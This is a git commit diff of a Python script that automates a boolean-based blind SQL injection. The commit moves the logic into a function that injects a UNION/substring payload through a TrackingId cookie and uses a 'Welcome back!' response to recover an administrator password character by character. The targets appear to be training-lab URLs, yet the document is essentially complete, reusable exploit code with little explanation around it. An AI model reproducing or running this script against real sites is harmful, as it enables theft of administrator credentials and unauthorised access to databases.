b363b86117957d22d80b0e2096dc2271d0c13ec9
0x2nac0nda <58049681+abdallaabdalrhman@users.noreply.github.com>
2023-11-25 03:08:10 +0300

    Update blind_sql_injection.py

--- blind_sql_injection.py
+++ blind_sql_injection.py
@@ -3,44 +3,53 @@ import string
 
 # Author : 0x2nac0nda
 
+def get_admin_password(url, character_set):
+    # Initialize session and headers
+    session = requests.Session()
+    headers = {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Cache-Control": "max-age=0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
+        "Connection": "close",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate"
+    }
+
+    # Initialize the found password
+    found_password = ""
+
+    # Iterate over each character position of the password
+    for position in range(1, 21):
+        for character in character_set:
+            # Construct the SQL injection query
+            injection_query = f"cc'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{position},1)='{character}' -- -"
+
+            # Set the cookies with the injection query
+            cookies = {
+                "TrackingId": injection_query,
+                "session": "7sZR51uSzYp8t4WQLggNSBUwPiHrDVt5"
+            }
+
+            try:
+                # Make the request
+                response = session.get(url, headers=headers, cookies=cookies)
+
+                if 'Welcome back!' in response.text:
+                    found_password += character
+                    print(found_password)
+                    break
+            except requests.RequestException as e:
+                print(f"An error occurred: {e}")
+                continue
+
+    return found_password
+
+# URL for the request
+url = "https://0adf0008049c408881d5bcca00810076.web-security-academy.net/"
+
 # Character set to test for each password character
-ch = string.ascii_letters + string.digits
+character_set = string.ascii_letters + string.digits
 
-# The URL for the request
-url = "https://0ab70000041b97168013c11800e60056.web-security-academy.net/"
-
-# Initialize the found password
-p = ""
-
-# Initialize session
-session = requests.Session()
-headers = {
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Cache-Control": "max-age=0",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
-    "Connection": "close",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate"
-}
-# Iterate over each character position of the password
-for i in range(1, 21):
-    for c in ch:
-        # Update cookies for each request
-        cookies = {
-            "TrackingId": f"cc'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{i},1)='{c}' -- -",
-            "session": "KbsHfTmEpYMAHdxDb2lHHQxJtmv8SeTE"
-        }
-
-        try:
-            # Make the request
-            response = session.get(url, headers=headers, cookies=cookies)
-            if 'Welcome back!' in response.text:
-                p += str(c)
-                print(p)
-                break
-        except requests.RequestException as e:
-            print(f"An error occurred: {e}")
-            continue
-
-# Final password
-print(f'[+] Found administrator password: {p}')
+# Find the administrator password
+admin_password = get_admin_password(url, character_set)
+print(f'[+] Found administrator password: {admin_password}')
